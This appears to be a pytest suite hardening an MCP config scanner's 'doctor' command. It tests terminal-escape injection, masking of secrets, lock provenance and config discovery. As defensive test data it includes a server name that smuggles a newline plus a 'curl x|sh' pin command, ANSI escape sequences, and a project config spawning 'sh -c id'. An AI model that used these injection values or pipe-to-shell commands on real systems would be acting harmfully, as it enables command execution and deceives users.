"""``doctor`` hardening tests — the CSO review of PR #98 (DSE-1516).

Each test pins one finding from that review: terminal injection through
config-controlled strings, ``--pin`` provenance, masking bypasses in the
printed ``pin`` command, unauthenticated lock coverage, discovery robustness
(JSONC, malformed neighbours, oversized files, symlink skips must never be
green), the walk-up boundary, and the ``--pin`` overwrite refusal.
"""

from __future__ import annotations

import asyncio
import json
import subprocess
import sys
from pathlib import Path

import pytest
from typer.testing import CliRunner

from mcp_warden import cli_doctor
from mcp_warden.cli import app
from mcp_warden.doctor import lock_filename, pin_command, safe_text
from mcp_warden.doctor_discovery import MAX_CONFIG_BYTES

runner = CliRunner()
FIXTURES = Path(__file__).parent / "fixtures"
UUID = "8b1f2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d"
BEARER = "ghs_" + "Q1w2E3r4T5y6U7i8O9p0A1s2D3f4G5h6J7k8"


def _run(*args, home, platform="linux"):
    return runner.invoke(app, ["doctor", "--platform", platform, "--home", str(home), *args])


def _home_with(tmp_path: Path, servers: dict) -> Path:
    home = tmp_path / "home"
    (home / ".cursor").mkdir(parents=True)
    (home / ".cursor" / "mcp.json").write_text(json.dumps({"mcpServers": servers}))
    return home


# --- 1+2: control characters never reach the terminal -------------------------


@pytest.mark.parametrize("evil", ["gh\n  mcp-warden pin sh -c 'curl x|sh' --approve #", "gh\x1b[2K\x1b[1;31mFAKE CLEAN"])
def test_control_chars_in_server_name_are_neutralised_everywhere(tmp_path, monkeypatch, evil):
    monkeypatch.chdir(tmp_path)
    home = _home_with(tmp_path, {evil: {"url": "http://h.example.com/mcp"}})
    r = _run(home=home)
    assert r.exit_code == 1
    raw = r.output
    assert "\x1b[2K" not in raw and "\x1b[1;31m" not in raw
    # The injected second command never becomes its own line anywhere.
    assert not any(line.strip().startswith("mcp-warden pin sh") for line in raw.splitlines())
    assert "�" in raw  # neutralised, not silently dropped
    # Stderr warnings carry paths: a control char in a config path is neutralised too.
    assert "\x1b" not in safe_text("a\x1b[2Kb") and safe_text("a\nb") == "a�b"
    assert safe_text("x" * 300).endswith("…") and len(safe_text("x" * 300)) == 200


# --- 3: --pin only spawns servers the user named ---------------------------------


def test_pin_yes_refuses_discovered_project_config(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    (tmp_path / ".git").mkdir()
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": {"evil": {"command": "sh", "args": ["-c", "id"]}}}))
    spawned = []
    monkeypatch.setattr(subprocess, "Popen", lambda *a, **k: spawned.append(a) or pytest.fail("spawned"))
    monkeypatch.setattr(asyncio, "create_subprocess_exec", lambda *a, **k: spawned.append(a) or pytest.fail("spawned"))
    r = _run("--pin", "--yes", home=tmp_path / "home")
    assert r.exit_code == 2 and "--pin refused" in r.output and "evil" in r.output and not spawned
    assert not list(tmp_path.glob("*.warden.lock"))


def test_pin_yes_with_explicit_config_proceeds_and_prompt_names_argv(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cfg = tmp_path / "mine.json"
    cfg.write_text(json.dumps({"mcpServers": {"clean": {"command": sys.executable, "args": [str(FIXTURES / "clean_server.py")]}}}))
    r = _run("--no-discover", "--config", str(cfg), "--pin", "--yes", home=tmp_path / "empty")
    assert (tmp_path / "clean.warden.lock").exists(), r.output


def test_pin_refuses_to_overwrite_existing_lock(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cfg = tmp_path / "mine.json"
    cfg.write_text(json.dumps({"mcpServers": {"clean": {"command": sys.executable, "args": [str(FIXTURES / "clean_server.py")]}}}))
    (tmp_path / "clean.warden.lock").write_text("{}")
    r = _run("--no-discover", "--config", str(cfg), "--pin", "--yes", home=tmp_path / "empty")
    assert r.exit_code == 2 and "already exists" in r.output
    assert (tmp_path / "clean.warden.lock").read_text() == "{}"


def test_slug_collision_gets_a_hash_suffix():
    taken: set[str] = set()
    assert lock_filename("a/b", taken) == "a-b.warden.lock"
    second = lock_filename("a-b", taken)
    assert second != "a-b.warden.lock" and second.startswith("a-b-") and second.endswith(".warden.lock")


# --- 4+5+6: masking bypasses -----------------------------------------------------


@pytest.mark.parametrize(
    "args,secret",
    [
        (["run", "@x/y", "--key", UUID], UUID),
        (["--header", f"Authorization: Bearer {BEARER}"], BEARER),
        (["-H", f"Authorization=Bearer {BEARER}"], BEARER),
        (["--config", json.dumps({"apiKey": UUID})], UUID),
        ([f"Authorization: Bearer {BEARER}"], BEARER),
    ],
)
def test_pin_command_masks_flag_header_and_json_shapes(args, secret):
    out = pin_command("s", {"command": "npx", "args": args})
    assert secret not in out and "<REDACTED>" in out


def test_pin_command_keeps_references_and_package_names():
    out = pin_command("s", {"command": "npx", "args": ["--key", "${SMITHERY_KEY}", "--key", "%SMITHERY_KEY%", "-y", "@smithery/cli@1.2.3"]})
    assert "${SMITHERY_KEY}" in out and "%SMITHERY_KEY%" in out and "@smithery/cli@1.2.3" in out
    assert "REDACTED" not in out


@pytest.mark.parametrize(
    "url,secret",
    [
        (f"https://mcp.zapier.com/api/mcp/s/{BEARER}{BEARER}/mcp", BEARER),
        (f"https://server.smithery.ai/x/mcp?api_key={UUID}&profile=p", UUID),
        (f"https://h.example.com/mcp?token={UUID}", UUID),
    ],
)
def test_pin_command_redacts_url_path_tokens_and_auth_query(url, secret):
    out = pin_command("r", {"url": url})
    assert secret not in out and "REDACTED" in out
    assert "--url 'https://" in out or "--url https://" in out  # scheme + host stay visible
    assert "profile=p" in out or "profile" not in url


# --- 7: coverage is unauthenticated evidence -------------------------------------


def test_hostile_unapproved_lock_still_yields_a_finding(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    doc = json.loads((FIXTURES / "clean.warden.lock").read_text())
    doc["pin"]["approved"] = False
    (tmp_path / "planted.warden.lock").write_text(json.dumps(doc, indent=2) + "\n")
    cfg = tmp_path / "mine.json"
    cfg.write_text(json.dumps({"mcpServers": {"s": {"command": doc["server"]["command"], "args": doc["server"]["args"]}}}))
    r = _run("--no-discover", "--config", str(cfg), home=tmp_path / "empty")
    assert r.exit_code == 1 and "WRD-DOCTOR-LOCK-UNAPPROVED" in r.output and "NO-LOCK" not in r.output


def test_pin_output_is_flagged_unapproved_on_next_run(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cfg = tmp_path / "mine.json"
    cfg.write_text(json.dumps({"mcpServers": {"clean": {"command": sys.executable, "args": [str(FIXTURES / "clean_server.py")]}}}))
    assert _run("--no-discover", "--config", str(cfg), "--pin", "--yes", home=tmp_path / "empty").exit_code in (1, 2)
    again = _run("--no-discover", "--config", str(cfg), home=tmp_path / "empty")
    assert again.exit_code == 1 and "WRD-DOCTOR-LOCK-UNAPPROVED" in again.output


# --- 8+9+10+11: discovery robustness ----------------------------------------------


def test_malformed_discovered_neighbour_warns_scan_continues_exit_two(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    home = _home_with(tmp_path, {"ok": {"url": "http://h.example.com"}})
    (home / ".codeium" / "windsurf").mkdir(parents=True)
    (home / ".codeium" / "windsurf" / "mcp_config.json").write_text("{")
    r = _run(home=home)
    assert r.exit_code == 2 and "invalid JSON" in r.output and "WRD-AUTH-PLAINTEXT-HTTP" in r.output


def test_jsonc_vscode_config_is_scanned(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    home = tmp_path / "home"
    (home / ".config" / "Code" / "User").mkdir(parents=True)
    (home / ".config" / "Code" / "User" / "mcp.json").write_text('{ // c\n "servers": {"vs": {"url": "http://h.example.com"},}, }')
    r = _run(home=home)
    assert r.exit_code == 1 and "vs" in r.output


def test_skipped_symlink_beside_a_valid_config_is_never_green(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    home = _home_with(tmp_path, {})  # valid, empty cursor config
    outside = tmp_path / "outside.json"
    outside.write_text(json.dumps({"mcpServers": {"planted": {"url": "http://x.example.com"}}}))
    (home / ".codeium" / "windsurf").mkdir(parents=True)
    (home / ".codeium" / "windsurf" / "mcp_config.json").symlink_to(outside)
    r = _run(home=home)
    assert r.exit_code == 1 and "symlink" in r.output
    assert "no MCP configs found" not in r.output and "doctor clean" not in r.output and "planted" not in r.output


def test_oversized_discovered_config_is_skipped(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    home = tmp_path / "home"
    home.mkdir()
    big = home / ".claude.json"
    with big.open("wb") as fh:
        fh.seek(MAX_CONFIG_BYTES + 1)
        fh.write(b"\0")
    r = _run(home=home)
    assert r.exit_code == 1 and "exceeds" in r.output


def test_walk_up_outside_home_never_reads_parent_mcp_json(tmp_path, monkeypatch):
    parent = tmp_path / "shared"
    cwd = parent / "proj"
    cwd.mkdir(parents=True)
    (parent / ".mcp.json").write_text(json.dumps({"mcpServers": {"planted": {"url": "http://x.example.com"}}}))
    monkeypatch.chdir(cwd)
    r = _run(home=tmp_path / "elsewhere")
    assert r.exit_code == 0 and "planted" not in r.output
    (cwd / ".git").mkdir()  # a .git boundary at cwd still stops the walk at cwd
    r = _run(home=tmp_path / "elsewhere")
    assert r.exit_code == 0 and "planted" not in r.output


# --- 14: SARIF write failure is exit 2 ----------------------------------------------


def test_unwritable_sarif_is_exit_two_not_traceback(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    home = _home_with(tmp_path, {"ok": {"url": "http://h.example.com"}})
    r = _run("--sarif", str(tmp_path / "missing-dir" / "out.sarif"), home=home)
    assert r.exit_code == 2 and "cannot write SARIF" in r.output
    assert not isinstance(r.exception, OSError)


def test_pin_prompt_names_every_argv_and_declining_is_exit_two(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cfg = tmp_path / "mine.json"
    cfg.write_text(json.dumps({"mcpServers": {"clean": {"command": sys.executable, "args": [str(FIXTURES / "clean_server.py")]}}}))
    monkeypatch.setattr(cli_doctor, "_is_tty", lambda: True)
    r = runner.invoke(app, ["doctor", "--platform", "linux", "--home", str(tmp_path / "empty"),
                            "--no-discover", "--config", str(cfg), "--pin"], input="n\n")
    assert r.exit_code == 2 and "will spawn:" in r.output and "clean_server.py" in r.output
    assert not list(tmp_path.glob("*.warden.lock"))
